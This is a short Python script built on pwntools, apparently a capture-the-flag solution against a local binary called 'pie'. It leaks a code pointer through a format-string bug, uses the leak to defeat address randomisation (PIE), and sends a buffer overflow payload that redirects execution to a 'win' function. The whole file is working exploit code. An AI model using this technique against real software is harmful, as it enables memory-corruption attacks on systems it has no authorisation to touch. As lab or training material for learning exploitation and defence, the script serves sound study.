from pwn import process

p = process("./pie")

query = "2\n%9$p\n"

p.clean()
p.sendline(query)
resp = p.clean().decode()
#print(resp)
v = (resp[resp.index("term: ")+8:][:12])
pi = int(v, 16)
orig = int("55555555562b", 16)

print("orig:", hex(orig))
print("value:", p)
offs = pi-orig
print("offset:", hex(offs))

win = int("55555555527c", 16)
address = (win + offs).to_bytes(8, "little")
padding = "3\n" + "A"*0x38

print("address:", address)
payload = padding.encode() + address
print("payload:", payload)

p.sendline(payload)
resp = p.clean().decode()
print(resp)
